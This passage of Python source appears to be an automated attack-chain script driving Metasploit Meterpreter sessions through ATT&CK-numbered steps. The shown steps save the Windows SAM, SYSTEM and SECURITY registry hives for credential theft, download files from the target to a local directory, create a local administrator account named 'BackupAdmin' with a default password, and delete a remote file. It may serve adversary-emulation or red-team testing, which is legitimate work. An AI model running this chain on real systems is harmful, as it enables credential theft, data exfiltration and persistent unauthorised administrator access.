        }
    executor_dict["executor3_var_in_plan"] = {
        "type": executor_dict["executor0_var_in_plan"]["type"] if "executor0_var_in_plan" in executor_dict else "Meterpreter Executor",
        "isDerivedExecutor": True,
        "RealSessionID": executor_dict["executor0_var_in_plan"]["RealSessionID"] if "executor0_var_in_plan" in executor_dict else None,
        "parentExecutor": "executor0_var_in_plan"
    }
    pddl_parameters["executor3_var_in_plan"] = executor_dict["executor3_var_in_plan"]["RealSessionID"]
    console.print(
        f"[bold green]  ↳ Derived executor_derived executor from Meterpreter session "
        f"{executor_dict['executor3_var_in_plan']['RealSessionID']}[/]"
    )
    _step_finished(9)
    _step_started(10, "Registry dump of SAM, creds, and secrets")

    console.print(f"[bold cyan]\n📌[Command Prompt Executor] Step 10[/]")
    console.print(f"[bold cyan]\n📌[Name] Registry dump of SAM, creds, and secrets[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Command Prompt session ID used to invoke reg save.")
    if "executor3_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor3_var_in_plan"]))
        user_params["executor"] = pddl_parameters["executor3_var_in_plan"]
    else:
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)
        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["executor"] = selected_session
        pddl_parameters["executor3_var_in_plan"] = selected_session
        metasploit_sessionid = selected_session
        executor_dict["executor3_var_in_plan"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: save_dir[/]")
    console.print(f"  Description: Directory on the target where the SAM / SYSTEM / SECURITY hives are written.")
    if "string1_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string1_var_in_plan"]))
        user_params["save_dir"] = pddl_parameters["string1_var_in_plan"]
    else:
        user_params["save_dir"] = _get_param_input("10_art-t1003_002-reg-save-sam", "save_dir", "string1_var_in_plan", '%TEMP%', True)
        pddl_parameters["string1_var_in_plan"] = user_params["save_dir"]
    _shell_cmd = rf"""reg save HKLM\sam {user_params['save_dir']}\sam
reg save HKLM\system {user_params['save_dir']}\system
reg save HKLM\security {user_params['save_dir']}\security
"""
    console.print(f"[bold cyan]\n[Command Prompt Executor] Command to run via Meterpreter:[/]")
    console.print(f"  [white]{_shell_cmd}[/]")
    confirm_action("Run this command?")
    console.print(f"[bold cyan][Command Prompt Executor] Running…[/]")
    try:
        _session_id = executor_dict["executor3_var_in_plan"]["RealSessionID"] if "executor3_var_in_plan" in executor_dict else metasploit_sessionid
        metasploit_executor.run_shell_cmd(_shell_cmd, session_id=_session_id)
    except Exception as e:
        _step_failed(e)
    _step_finished(10)
    _step_started(11, "File Download Operation")

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 11[/]")
    console.print(f"[bold cyan]\n📌[Name] File Download Operation[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection.")
    if "executor2_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor2_var_in_plan"]))
        user_params["executor"] = pddl_parameters["executor2_var_in_plan"]
    else:
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)
        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["executor"] = selected_session
        pddl_parameters["executor2_var_in_plan"] = selected_session
        metasploit_sessionid = selected_session
        executor_dict["executor2_var_in_plan"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: remote_path[/]")
    console.print(f"  Description: Full path to remote file/directory")
    user_params["remote_path"] = _get_param_input("11_meterpreter-download", "remote_path", "string1_var_in_plan", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_dir[/]")
    console.print(f"  Description: Local directory to save files")
    user_params["output_dir"] = _get_param_input("11_meterpreter-download", "output_dir", "", '/tmp', True)
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: download[/]")
    confirm_action()
    try:
        metasploit_executor.download(remote_path="'" + str(user_params["remote_path"]) + "'", local_path="'" + str(user_params["output_dir"]) + "'", meterpreter_sessionid=str(user_params["executor"]))
    except Exception as e:
        _step_failed(e)
    _step_finished(11)
    _step_started(12, "Create a new Windows admin user")

    console.print(f"[bold cyan]\n📌[Command Prompt Executor] Step 12[/]")
    console.print(f"[bold cyan]\n📌[Name] Create a new Windows admin user[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Command Prompt session ID used to invoke net.")
    if "executor3_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor3_var_in_plan"]))
        user_params["executor"] = pddl_parameters["executor3_var_in_plan"]
    else:
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)
        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["executor"] = selected_session
        pddl_parameters["executor3_var_in_plan"] = selected_session
        metasploit_sessionid = selected_session
        executor_dict["executor3_var_in_plan"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: username[/]")
    console.print(f"  Description: Local admin account name to create.")
    user_params["username"] = _get_param_input("12_art-t1136_001-net-user-admin", "username", "", 'BackupAdmin', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: password[/]")
    console.print(f"  Description: Password for the new admin account.")
    user_params["password"] = _get_param_input("12_art-t1136_001-net-user-admin", "password", "", 'ComplexPass!23', True)
    _shell_cmd = rf"""net user /add "{user_params['username']}" "{user_params['password']}"
net localgroup administrators "{user_params['username']}" /add
"""
    console.print(f"[bold cyan]\n[Command Prompt Executor] Command to run via Meterpreter:[/]")
    console.print(f"  [white]{_shell_cmd}[/]")
    confirm_action("Run this command?")
    console.print(f"[bold cyan][Command Prompt Executor] Running…[/]")
    try:
        _session_id = executor_dict["executor3_var_in_plan"]["RealSessionID"] if "executor3_var_in_plan" in executor_dict else metasploit_sessionid
        metasploit_executor.run_shell_cmd(_shell_cmd, session_id=_session_id)
    except Exception as e:
        _step_failed(e)
    _step_finished(12)
    _step_started(13, "Delete Remote File")

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 13[/]")
    console.print(f"[bold cyan]\n📌[Name] Delete Remote File[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection.")
    if "executor0_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0_var_in_plan"]))
        user_params["executor"] = pddl_parameters["executor0_var_in_plan"]
    else:
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)
        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["executor"] = selected_session
        pddl_parameters["executor0_var_in_plan"] = selected_session
        metasploit_sessionid = selected_session
        executor_dict["executor0_var_in_plan"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: RemotePath[/]")
    console.print(f"  Description: Remote path of the file to delete")
    user_params["RemotePath"] = _get_param_input("13_meterpreter-delete", "RemotePath", "string2_var_in_plan", '', True)
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: delete[/]")
    confirm_action()
    try:
        metasploit_executor.delete(file_path="'" + str(user_params["RemotePath"]) + "'", meterpreter_sessionid=str(user_params["executor"]))
    except Exception as e:
        _step_failed(e)
    _step_finished(13)

    _print_chain_summary()
    # CI-style exit code: chain that had any failed step returns 1 so
    # batch runners / cron / driver scripts detect it without parsing
    # the summary. Successful chain returns 0.
    if any(r["status"] == "failed" for r in _STEP_RECORDS):
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
